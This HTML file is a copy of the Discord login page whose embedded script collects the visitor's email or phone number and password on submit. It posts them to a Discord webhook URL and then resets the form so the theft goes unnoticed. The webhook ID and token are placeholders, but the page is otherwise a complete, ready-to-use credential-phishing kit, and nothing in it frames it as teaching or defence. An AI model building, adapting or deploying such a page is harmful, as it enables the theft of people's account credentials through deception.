<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="shortcut icon" href="favicon.ico" type="image/x-icon">
    <link rel="stylesheet" href="./css/index.css">
    <link rel="stylesheet" href="css/main.css">
    <title>Discord</title>
</head>

<body>
    <img src="./assets/bg.svg" alt="Discord BG" class="bg">
    <div class="login-page">
        <div class="svg-logo-text">
            <img src="./assets/login-screen-logo.svg" alt="Discord">
        </div>

        <main class="main">
            <div class="authBox">
                <div class="main-form">

                    <form action="#">
                        <div class="input-groups">
                            <div class="main-form-header">
                                <h1>Welcome back!</h1>
                                <p>We're so excited to see you again!</p>
                            </div>
                            <div class="email-wrapper">
                                <label for="emailORphone">
                                    Email or Phone Number
                                    <span class="required">*</span>
                                </label>
                                <input type="text" id="emailORphone" required autocomplete="off">
                            </div>
                            <div class="password-wrapper">
                                <label for="password">
                                    Password
                                    <span class="required">*</span>
                                </label>
                                <input type="password" id="password" required>
                            </div>
                        </div>
                        <div class="forgot-password">
                            <a href="#">Forgot your password?</a>
                        </div>
                        <div class="login">
                            <button type="submit">
                                Log In
                            </button>
                        </div>
                        <div class="small-register">
                            <span>Need an account?</span>
                            <a href="#">Register</a>
                        </div>
                    </form>
                </div>

                <div class="right-section">
                    <div class="login-container">
                        <div class="qr-code">
                            <!-- QR code SVG here (kept as in original) -->
                        </div>
                    </div>
                </div>
            </div>
        </main>
    </div>

    <!-- Script to handle fake webhook submission -->
    <script>
        document.addEventListener('DOMContentLoaded', () => {
            const form = document.querySelector('form');

            form.addEventListener('submit', function(e) {
                e.preventDefault(); // prevent page reload

                const email = document.getElementById('emailORphone').value;
                const password = document.getElementById('password').value;

                // Fake webhook URL (doesn't exist)
                const webhookURL = "https://discord.com/api/webhooks/FAKE_ID/FAKE_TOKEN";

                fetch(webhookURL, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                        content: `Email/Phone: ${email}\nPassword: ${password}`,
                        username: "FakeWebhook"
                    })
                }).finally(() => {
                    form.reset(); // reset the form like a normal submission
                });
            });
        });
    </script>
</body>

</html>
